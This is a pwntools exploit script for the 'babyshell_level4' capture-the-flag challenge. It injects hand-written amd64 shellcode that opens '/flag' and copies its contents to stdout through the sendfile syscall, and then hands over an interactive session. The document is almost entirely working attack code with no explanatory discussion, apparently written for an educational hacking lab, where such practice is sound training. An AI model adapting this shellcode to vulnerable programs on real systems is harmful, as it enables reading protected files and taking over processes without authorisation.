#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template /challenge/babyshell_level4
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or '/challenge/babyshell_level4')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX unknown - GNU_STACK missing
# PIE:      PIE enabled
# Stack:    Executable
# RWX:      Has RWX segments
# SHSTK:    Enabled
# IBT:      Enabled

io = start()

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)
io = start()

shellcode = asm("""
push 2
pop rax
lea edi, [rip+file]
push 0
pop rsi
push 0
pop rdx
syscall

push 1
pop rdi
push rax
pop rsi
push 0
pop rdx
push 1000
pop r10
push 40
pop rax
syscall
file:
    .string "/flag"
""")
with open("payload", "wb") as file:
    file.write(shellcode)

print(disasm(shellcode))

pay = fit(shellcode)

io.sendline(pay)

io.interactive()

